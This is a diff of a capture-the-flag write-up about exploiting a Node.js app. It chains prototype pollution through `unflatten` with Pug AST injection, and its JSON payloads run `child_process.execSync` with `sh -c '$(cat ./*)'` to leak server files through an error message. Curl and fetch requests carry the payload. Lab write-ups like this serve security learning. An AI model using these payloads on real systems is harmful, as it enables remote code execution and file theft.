@@ -1,27 +1,28 @@
-So due to how the pug engine works and the fact that your input is run through unflatten you can do prototype polution
+Starting with the code we can see it runs out input through `unflatten`. Doing some research around this suggests it will expand any var so we maybe able to do prototype polution.
 
-We run this as it will cat out all files and then error as its trying to run that as a command therefor allowing us to read the output in the error
+Following on with that I ran it locally and set a break point just after the unflatten with the following test
+```json
+{
+    "song.name": "ASTa la vista baby",
+    "__proto__.test": "test"
+}
+```
+Doing this proved I can do prototype polution by passing in data
+
+Next I started looking at the pug framework and found that its possible via the `block` value as mentioned in https://blog.p6.is/AST-Injection/#Pug
+
+So using this data we can build the below query to get the server to run a command and then try to run that output, therefor throwing an error so we can exfiltrate the data obtained
 ```bash
 sh -c '$(cat ./*)'
 ```
 
-```js
-fetch("http://46.101.54.143:31088/api/submit", {
-  "headers": {
-    "accept": "*/*",
-    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
-    "cache-control": "no-cache",
-    "content-type": "application/json",
-    "pragma": "no-cache"
-  },
-  "referrer": "http://46.101.54.143:31088/",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": JSON.stringify({
+```json
+{
     "song.name": "ASTa la vista baby",
     "__proto__.block": {"type":"Text","line":"process.mainModule.require('child_process').execSync(`sh -c '$(cat ./*)'`)"}
-}),
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "omit"
-});
+}
+```
+
+```bash
+CURL -X POST -H "Content-Type: application/json" -F "{\"song.name\":\"ASTa la vista baby\",\"__proto__.block\":{\"type\":\"Text\",\"line\":\"process.mainModule.require('child_process').execSync(`sh -c '$(cat ./*)'`)\"}}" http://127.0.0.1:1337/api/submit
 ```
